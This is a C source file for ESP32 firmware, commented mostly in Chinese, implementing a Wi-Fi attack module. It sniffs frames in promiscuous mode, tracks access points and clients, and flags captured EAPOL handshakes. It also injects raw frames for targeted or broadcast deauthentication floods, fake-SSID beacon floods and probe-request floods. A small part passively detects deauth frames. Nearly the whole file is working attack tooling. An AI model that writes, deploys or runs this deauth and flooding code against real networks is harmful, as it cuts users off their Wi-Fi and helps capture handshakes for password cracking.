/*
 * wifi_attack.c — Wi-Fi 攻击模块实现
 *
 * 参考:
 *   - ESP-IDF simple_sniffer (cmd_sniffer.c) promiscuous 启动链 / 回调解析
 *   - esp_wifi.h esp_wifi_80211_tx() 原始帧注入
 *
 * 状态机:
 *   IDLE  --sniff_start-->  SNIFF   --sniff_stop/done-->  IDLE
 *   IDLE  --deauth/beacon/probe_start-->  INJECT  --stop/done-->  IDLE
 * 嗅探与注入互斥 (cli 层强制).
 *
 * 安全停止: promiscuous 回调运行在 wifi task 上下文, 直接调 set_promiscuous(false)
 *   可能死锁. 故回调只递减计数 + 唤醒独立 stopper task, 由后者执行真正停止.
 */
#include "wifi_attack.h"
#include "radio_common.h"
#include "rgb_led.h"
#include "wifi_db.h"

#include <stdatomic.h>
#include <string.h>
#include <stdio.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include "esp_log.h"
#include "esp_check.h"
#include "nvs_flash.h"
#include "esp_event.h"
#include "esp_netif.h"
#include "esp_wifi.h"
#include "esp_timer.h"
#include "esp_random.h"
#include "esp_rom_uart.h"
#include <stdarg.h>

static const char *TAG = "WIFI";

/* Direct UART write bypassing stdio lock. Used by inject_task (low prio)
 * to avoid priority-inheritance deadlock with cli_task (high prio) printf. */
static void raw_out(const char *fmt, ...)
{
    char buf[256];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    if (n > 0) {
        if (n > (int)sizeof(buf)) n = sizeof(buf);
        for (int i = 0; i < n; i++) {
            esp_rom_uart_tx_one_char(buf[i]);
        }
    }
}

/* ===================== 模块状态 ===================== */
static _Atomic wifi_atk_state_t s_state = WIFI_ATK_IDLE;
static _Atomic uint32_t s_sniff_remaining = 0;   /* 0 = 永续; >0 递减到 0 触发停 */
static _Atomic uint32_t s_sniff_total     = 0;
static _Atomic uint8_t  s_sniff_channel   = 0;
static _Atomic uint32_t s_inject_total    = 0;

static SemaphoreHandle_t s_inject_mtx  = NULL;    /* 同时仅一个注入任务 */
static SemaphoreHandle_t s_stop_sem    = NULL;    /* 唤醒嗅探 stopper 任务 */
static TaskHandle_t      s_inject_task = NULL;
static _Atomic bool      s_inject_stop  = false;

/* ===================== 信道轮询任务 ===================== */
static _Atomic bool s_channel_rotate = false;
static _Atomic uint32_t s_dwell_ms = 1000;

static void channel_rotate_task(void *pv)
{
    uint8_t ch = 1;
    while (atomic_load(&s_channel_rotate)) {
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        atomic_store(&s_sniff_channel, ch);
        rgb_led_event(RGB_EV_CHAN_SWITCH, 300);
        ch++;
        if (ch > 13) ch = 1;
        vTaskDelay(pdMS_TO_TICKS(atomic_load(&s_dwell_ms)));
    }
    vTaskDelete(NULL);
}

/* ===================== 注入任务参数 ===================== */
typedef enum {
    INJECT_DEAUTH,
    INJECT_BEACON,
    INJECT_PROBE,
} inject_mode_t;

typedef struct {
    inject_mode_t mode;
    uint8_t  bssid[6];
    uint8_t  sta[6];
    uint16_t reason;
    char     ssid_prefix[32];
    uint8_t  channel;
    uint32_t count;          /* 0 = 持续 */
    uint32_t interval_ms;
} inject_args_t;

/* ===================== 嗅探 stopper 任务 (安全停止) ===================== */
static void sniff_stopper_task(void *pv)
{
    while (1) {
        xSemaphoreTake(s_stop_sem, portMAX_DELAY);
        /* 唤醒: 执行真正停止 */
        esp_wifi_set_promiscuous(false);
        atomic_store(&s_state, WIFI_ATK_IDLE);
        rgb_led_set_status(RGB_IDLE);
        printf("META,WIFI,SNIFF,DONE,total,%u\n",
               (unsigned)atomic_load(&s_sniff_total));
        fflush(stdout);
    }
}

/* ===================== promiscuous 回调 ===================== */

/* 从 mgmt 帧体里提取 SSID IE. 返回写入 dst 的字节数 (不含 nul), 失败 0. */
static int extract_ssid(const uint8_t *frame, int len, char *dst, int dst_cap)
{
    int off = 24;
    while (off + 2 <= len) {
        uint8_t id   = frame[off];
        uint8_t slen = frame[off + 1];
        if (off + 2 + slen > len) break;
        if (id == 0) {
            if (slen == 0) { dst[0] = '\0'; return 0; }
            int n = slen < dst_cap - 1 ? slen : dst_cap - 1;
            memcpy(dst, frame + off + 2, n);
            dst[n] = '\0';
            for (int i = 0; i < n; i++) {
                if ((unsigned char)dst[i] < 0x20 || (unsigned char)dst[i] > 0x7e) {
                    dst[0] = '\0';
                    return 0;
                }
            }
            return n;
        }
        off += 2 + slen;
    }
    dst[0] = '\0';
    return 0;
}

static void wifi_sniff_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    /* state != SNIFF 表示已在停止中或已停, 直接丢弃后续包 */
    if (atomic_load(&s_state) != WIFI_ATK_SNIFF) return;
    if (!buf || type == WIFI_PKT_MISC) return;

    const wifi_promiscuous_pkt_t *p = (const wifi_promiscuous_pkt_t *)buf;
    if (p->rx_ctrl.rx_state != 0) return;   /* FCS 校验失败 */

    int sig_len = p->rx_ctrl.sig_len;
    if (sig_len < 24) return;
    int frame_len = sig_len - 4;            /* sig_len 含 FCS, pcap 用无 FCS */
    if (frame_len <= 0 || frame_len > RFTOOL_MAX_FRAME_LEN) return;

    const uint8_t *f = p->payload;
    uint8_t ftype = frame_type(f);
    uint8_t fsub  = frame_subtype(f);
    int8_t  rssi  = (int8_t)p->rx_ctrl.rssi;

    char da[18], sa[18], bssid[18];
    mac_to_str(f + 4,  da);
    mac_to_str(f + 10, sa);
    mac_to_str(f + 16, bssid);

    char ssid[34] = "-";
    if ((ftype == FC_TYPE_MGMT) && (fsub == 0x8 || fsub == 0x5)) {
        extract_ssid(f, frame_len, ssid, sizeof(ssid));
        if (ssid[0] == '\0') { memcpy(ssid, "<hidden>", 9); }
    }
    /* Track AP in database (beacon/probe_resp) */
    if (ftype == FC_TYPE_MGMT && (fsub == 0x8 || fsub == 0x5)) {
        wifi_db_update_ap(f, frame_len, atomic_load(&s_sniff_channel), rssi);
    }
    /* Track clients from data frames */
    if (ftype == FC_TYPE_DATA) {
        wifi_db_update_client(f, frame_len, rssi);
        if (wifi_db_check_eapol(f, frame_len, rssi)) {
            char esrc[18], edst[18];
            mac_to_str(f + 10, esrc);
            mac_to_str(f + 4, edst);
            printf("META,WIFI,EAPOL,DETECTED,src,%s,dst,%s\n", esrc, edst);
            fflush(stdout);
            rgb_led_pulse(80, 80, 80, 0);
        }
    }
    /* Passive deauth detection */
    if (ftype == FC_TYPE_MGMT && fsub == 0xc) {
        printf("META,WIFI,DEAUTH,DETECTED,src,%s,dst,%s,rssi,%d\n", sa, da, rssi);
        fflush(stdout);
    }

    printf("PKT,WIFI,%s,%s,%d,%d,%s,%s,%s,%s\n",
           frame_type_str(ftype), frame_subtype_str(ftype, fsub),
           frame_len, rssi, sa, da, bssid, ssid);
    fflush(stdout);

    print_hex_line(f, frame_len);

    uint32_t total = atomic_fetch_add(&s_sniff_total, 1) + 1;

    /* 计数模式: 递减, 到 0 唤醒 stopper 安全停止.
     * fetch_sub 返回旧值; 旧值==1 表示这是最后一包. */
    uint32_t rem = atomic_load(&s_sniff_remaining);
    if (rem > 0 && rem != UINT32_MAX) {
        uint32_t old = atomic_fetch_sub(&s_sniff_remaining, 1);
        if (old == 1) {
            /* 标记停止中, 阻止后续回调继续处理 */
            atomic_store(&s_state, WIFI_ATK_IDLE);
            xSemaphoreGive(s_stop_sem);
        }
    }
    (void)total;
}

/* ===================== 注入任务 ===================== */

static void inject_task(void *pv)
{
    inject_args_t *a = (inject_args_t *)pv;
    uint32_t sent = 0;
    uint8_t frame[RFTOOL_MAX_FRAME_LEN];

    while (!atomic_load(&s_inject_stop)) {
        if (a->count && sent >= a->count) break;

        int len = -1;
        if (a->mode == INJECT_DEAUTH) {
            bool broadcast = (a->sta[0]|a->sta[1]|a->sta[2]|a->sta[3]|a->sta[4]|a->sta[5]) == 0;
            if (broadcast) {
                uint8_t bc[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
                len = mk_deauth_frame(frame, a->bssid, bc, true, a->reason);
            } else {
                len = mk_deauth_frame(frame, a->bssid, a->sta, true, a->reason);
                uint8_t f2[26];
                int l2 = mk_deauth_frame(f2, a->bssid, a->sta, false, a->reason);
                esp_wifi_80211_tx(WIFI_IF_STA, f2, l2, true);
            }
        } else if (a->mode == INJECT_BEACON) {
            uint8_t src[6];
            esp_fill_random(src, 6);
            char ssid[40];
            uint32_t rnd = (uint32_t)esp_random();
            snprintf(ssid, sizeof(ssid), "%s%u", a->ssid_prefix, (unsigned)(rnd % 10000));
            uint32_t tsf = (uint32_t)(esp_timer_get_time() & 0xffffffff);
            len = mk_beacon_frame(frame, sizeof(frame), src, tsf, 100, a->channel, ssid);
        } else { /* INJECT_PROBE */
            uint8_t src[6];
            esp_fill_random(src, 6);
            len = mk_probe_req_frame(frame, sizeof(frame), src, NULL);
        }

        if (len > 0) {
            esp_err_t e = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, true);
            sent++;
            atomic_store(&s_inject_total, sent);
            rgb_led_event(RGB_EV_TX_OK, 50);
            if (e != ESP_OK) {
                raw_out("META,WIFI,INJECT,ERR,code,%d\n", e);
            }
            /* breath task handles flashing */
        }

        if (a->interval_ms) vTaskDelay(pdMS_TO_TICKS(a->interval_ms));
        else                vTaskDelay(pdMS_TO_TICKS(20));   /* 默认 ~50 fps */
    }

    atomic_store(&s_state, WIFI_ATK_IDLE);
    rgb_led_set_status(RGB_IDLE);
    raw_out("META,WIFI,INJECT,DONE,mode,%d,sent,%u\n",
            (int)a->mode, (unsigned)sent);

    free(a);
    s_inject_task = NULL;
    xSemaphoreGive(s_inject_mtx);
    vTaskDelete(NULL);
}

/* ===================== 公共 API ===================== */

esp_err_t wifi_attack_init(void)
{
    if (!s_inject_mtx) {
        s_inject_mtx = xSemaphoreCreateMutex();
        ESP_RETURN_ON_FALSE(s_inject_mtx, ESP_ERR_NO_MEM, TAG, "mtx create");
    }
    if (!s_stop_sem) {
        s_stop_sem = xSemaphoreCreateBinary();
        ESP_RETURN_ON_FALSE(s_stop_sem, ESP_ERR_NO_MEM, TAG, "stop sem create");
        xTaskCreate(sniff_stopper_task, "snifstop", 3072, NULL, 6, NULL);
    }

    esp_err_t err = nvs_flash_init();
    if (err == ESP_ERR_NVS_NO_FREE_PAGES || err == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_RETURN_ON_ERROR(nvs_flash_erase(), TAG, "nvs erase");
        err = nvs_flash_init();
    }
    ESP_RETURN_ON_ERROR(err, TAG, "nvs init");

    ESP_RETURN_ON_ERROR(esp_netif_init(), TAG, "netif init");
    ESP_RETURN_ON_ERROR(esp_event_loop_create_default(), TAG, "event loop");
    esp_netif_create_default_wifi_sta();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_RETURN_ON_ERROR(esp_wifi_init(&cfg), TAG, "wifi init");
    ESP_RETURN_ON_ERROR(esp_wifi_set_mode(WIFI_MODE_STA), TAG, "set mode STA");
    ESP_RETURN_ON_ERROR(esp_wifi_start(), TAG, "wifi start");
    esp_wifi_set_ps(WIFI_PS_NONE);   /* 关省电, 减少 tx 抖动 */

    wifi_db_init();
    ESP_LOGI(TAG, "Wi-Fi init ok (STA, PS_NONE)");
    rgb_led_set_status(RGB_IDLE);
    return ESP_OK;
}

esp_err_t wifi_attack_sniff_start(uint8_t channel, uint32_t count)
{
    if (atomic_load(&s_state) != WIFI_ATK_IDLE) {
        return ESP_ERR_INVALID_STATE;
    }
    if (channel < 1 || channel > 14) return ESP_ERR_INVALID_ARG;

    wifi_promiscuous_filter_t filt = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA,
    };
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(wifi_sniff_cb);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    wifi_db_clear();
    atomic_store(&s_sniff_channel, channel);
    /* count=0 -> 永续: 用 UINT32_MAX 占位 (回调里 !=UINT32_MAX 才递减, 故永不动) */
    atomic_store(&s_sniff_remaining, count ? count : UINT32_MAX);
    atomic_store(&s_sniff_total, 0);
    atomic_store(&s_state, WIFI_ATK_SNIFF);
    rgb_led_set_status(RGB_SNIFF_SINGLE);

    printf("META,WIFI,SNIFF,START,channel,%u,count,%lu\n",
           channel, (unsigned long)(count ? count : 0xFFFFFFFFUL));
    fflush(stdout);
    return ESP_OK;
}



static esp_err_t inject_start_common(inject_args_t *a)
{
    if (atomic_load(&s_state) != WIFI_ATK_IDLE) {
        free(a);
        return ESP_ERR_INVALID_STATE;
    }
    if (xSemaphoreTake(s_inject_mtx, pdMS_TO_TICKS(2000)) != pdTRUE) {
        free(a);
        return ESP_ERR_TIMEOUT;
    }
    atomic_store(&s_inject_stop, false);
    atomic_store(&s_inject_total, 0);
    atomic_store(&s_state, WIFI_ATK_INJECT);
    switch (a->mode) {
        case INJECT_DEAUTH: rgb_led_set_status(RGB_INJECT_DEAUTH); break;
        case INJECT_BEACON: rgb_led_set_status(RGB_INJECT_BEACON); break;
        case INJECT_PROBE:  rgb_led_set_status(RGB_INJECT_PROBE);  break;
    }

    BaseType_t r = xTaskCreate(inject_task, "inject", 4096, a, 5, &s_inject_task);
    if (r != pdPASS) {
        atomic_store(&s_state, WIFI_ATK_IDLE);
        rgb_led_set_status(RGB_IDLE);
        xSemaphoreGive(s_inject_mtx);
        free(a);
        return ESP_FAIL;
    }
    return ESP_OK;
}

esp_err_t wifi_attack_deauth_start(const uint8_t bssid[6], const uint8_t sta[6],
                                   uint32_t count, uint16_t reason, uint32_t interval_ms)
{
    if (!bssid) return ESP_ERR_INVALID_ARG;
    inject_args_t *a = calloc(1, sizeof(*a));
    ESP_RETURN_ON_FALSE(a, ESP_ERR_NO_MEM, TAG, "no mem");
    a->mode = INJECT_DEAUTH;
    memcpy(a->bssid, bssid, 6);
    if (sta) memcpy(a->sta, sta, 6);   /* NULL -> 全 0 = 广播 deauth */
    a->reason = reason;
    a->count = count;
    a->interval_ms = interval_ms;
    return inject_start_common(a);
}

esp_err_t wifi_attack_beacon_flood_start(const char *prefix, uint32_t count, uint32_t interval_ms)
{
    if (!prefix || !prefix[0]) return ESP_ERR_INVALID_ARG;
    inject_args_t *a = calloc(1, sizeof(*a));
    ESP_RETURN_ON_FALSE(a, ESP_ERR_NO_MEM, TAG, "no mem");
    a->mode = INJECT_BEACON;
    strncpy(a->ssid_prefix, prefix, sizeof(a->ssid_prefix) - 1);
    {
        uint8_t ch = atomic_load(&s_sniff_channel);
        a->channel = ch ? ch : 6;
    }
    a->count = count;
    a->interval_ms = interval_ms;
    return inject_start_common(a);
}

esp_err_t wifi_attack_probe_flood_start(uint32_t count, uint32_t interval_ms)
{
    inject_args_t *a = calloc(1, sizeof(*a));
    ESP_RETURN_ON_FALSE(a, ESP_ERR_NO_MEM, TAG, "no mem");
    a->mode = INJECT_PROBE;
    a->count = count;
    a->interval_ms = interval_ms;
    return inject_start_common(a);
}

esp_err_t wifi_attack_inject_stop(void)
{
    if (atomic_load(&s_state) != WIFI_ATK_INJECT) {
        return ESP_ERR_INVALID_STATE;
    }
    atomic_store(&s_inject_stop, true);
    for (int i = 0; i < 300 && s_inject_task; i++) {
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    return ESP_OK;
}

esp_err_t wifi_attack_sniff_auto_start(uint32_t dwell_ms)
{
    if (atomic_load(&s_state) != WIFI_ATK_IDLE) {
        return ESP_ERR_INVALID_STATE;
    }
    if (dwell_ms < 100) dwell_ms = 100;

    wifi_promiscuous_filter_t filt = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA,
    };
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(wifi_sniff_cb);
    esp_wifi_set_promiscuous(true);

    wifi_db_clear();
    atomic_store(&s_dwell_ms, dwell_ms);
    atomic_store(&s_channel_rotate, true);
    atomic_store(&s_sniff_remaining, UINT32_MAX);
    atomic_store(&s_sniff_total, 0);
    atomic_store(&s_state, WIFI_ATK_SNIFF);
    rgb_led_set_status(RGB_SNIFF_AUTO);

    BaseType_t r = xTaskCreate(channel_rotate_task, "chrot", 2048, NULL, 5, NULL);
    if (r != pdPASS) {
        atomic_store(&s_state, WIFI_ATK_IDLE);
        atomic_store(&s_channel_rotate, false);
        esp_wifi_set_promiscuous(false);
        rgb_led_set_status(RGB_IDLE);
        return ESP_FAIL;
    }

    printf("META,WIFI,SNIFF,AUTO,START,dwell_ms,%u\n", (unsigned)dwell_ms);
    fflush(stdout);
    return ESP_OK;
}

static void sniff_stop_common(void)
{
    if (atomic_load(&s_channel_rotate)) {
        atomic_store(&s_channel_rotate, false);
    }
    /* Directly disable promiscuous - safe from any task context.
     * The callback checks s_state != SNIFF and returns early,
     * so there's no race even if a packet is being processed. */
    esp_wifi_set_promiscuous(false);
}

esp_err_t wifi_attack_sniff_stop(void)
{
    /* If definitely not sniffing, bail fast. But also handle the race where
     * state shows IDLE but promiscuous is still on (e.g. callback just set
     * IDLE but hasn't disabled promisc yet). */
    wifi_atk_state_t st = atomic_load(&s_state);
    if (st != WIFI_ATK_SNIFF) {
        /* Defensive: force-close promiscuous regardless of state */
        if (atomic_load(&s_channel_rotate)) {
            atomic_store(&s_channel_rotate, false);
        }
        esp_wifi_set_promiscuous(false);
        return ESP_ERR_INVALID_STATE;
    }
    sniff_stop_common();
    atomic_store(&s_state, WIFI_ATK_IDLE);
    xSemaphoreGive(s_stop_sem);
    return ESP_OK;
}

void wifi_attack_status(void)
{
    wifi_atk_state_t st = atomic_load(&s_state);
    const char *stname = (st == WIFI_ATK_SNIFF)  ? "SNIFF"  :
                         (st == WIFI_ATK_INJECT) ? "INJECT" : "IDLE";
    bool auto_ch = atomic_load(&s_channel_rotate);
    printf("META,WIFI,STATUS,state,%s,channel,%u,auto_ch,%u,sniff_total,%u,inject_total,%u,aps,%u,clients,%u,eapols,%u\n",
           stname,
           (unsigned)atomic_load(&s_sniff_channel),
           auto_ch ? 1u : 0u,
           (unsigned)atomic_load(&s_sniff_total),
           (unsigned)atomic_load(&s_inject_total),
           (unsigned)wifi_db_ap_count(),
           (unsigned)wifi_db_client_count(),
           (unsigned)wifi_db_eapol_count());
    fflush(stdout);
}


/* ===================== 外部 getter (HTTP 用) ===================== */
int wifi_atk_state_val(void)       { return (int)atomic_load(&s_state); }
uint8_t wifi_atk_channel(void)     { return (uint8_t)atomic_load(&s_sniff_channel); }
bool wifi_atk_auto_ch(void)        { return atomic_load(&s_channel_rotate); }
uint32_t wifi_atk_sniff_total(void){ return (uint32_t)atomic_load(&s_sniff_total); }
uint32_t wifi_atk_inject_total(void){ return (uint32_t)atomic_load(&s_inject_total); }
